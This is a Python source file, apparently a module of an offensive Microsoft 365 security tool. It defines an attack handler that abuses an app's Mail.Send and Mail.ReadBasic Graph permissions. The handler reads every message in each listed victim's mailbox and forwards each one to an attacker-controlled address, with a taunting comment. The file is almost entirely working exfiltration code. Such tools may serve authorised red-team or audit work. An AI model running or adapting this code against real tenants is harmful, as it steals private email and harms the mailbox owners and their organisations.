from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.mail_send_handler')


class MailSend_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        if ("Mail.Send" in request.roles) and ("Mail.ReadBasic" in request.roles):
            logger.info('tid: %s, appid: %s may be vulnerable to mail_send vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "MailSendVectors"
            message = ""
            error = "MailSendVectors - failed"
            conf = request.attack_config['mailSend']
            
            logger.debug("Mail.Send - Allows the app to send mail as users in the organization.")
            logger.debug("Mail.ReadBasic - Allows the app to read basic mail properties in all mailboxes without a signed-in user. Includes all properties except body, previewBody, attachments and any extended properties.")
            logger.debug("Attack vector - read all mails.")         
            try:
                for user in conf["victims"]:
                    create_message_URL = "https://graph.microsoft.com/v1.0/users/" + user + "/messages/"
                    result = requests.get(create_message_URL, headers=request.request_headers)
                    if result.status_code == 200:
                        json = result.json()
                        values = json["value"]
                        for value in values:

                            create_message_URL = "https://graph.microsoft.com/beta/users/" + user + "/messages/" + value["id"] + "/forward"
                            body = {
                                "message": {
                                    "isDeliveryReceiptRequested": False,
                                    "toRecipients": [
                                        {
                                            "emailAddress": {
                                                "address": conf["attacker"],
                                                "name": "attacker"
                                            }
                                        }
                                    ]
                                },
                                "comment": "Hi, christmas came earlier this year:)"
                            }
                            res = requests.post(create_message_URL, json=body, headers=request.request_headers)
                            if res.status_code == 202:
                                message += "Sent mail with subject: %s \n" % (value["subject"])
                                status = True
  
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in send_handler_Handler function")
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
        return super().handle(request,responses)
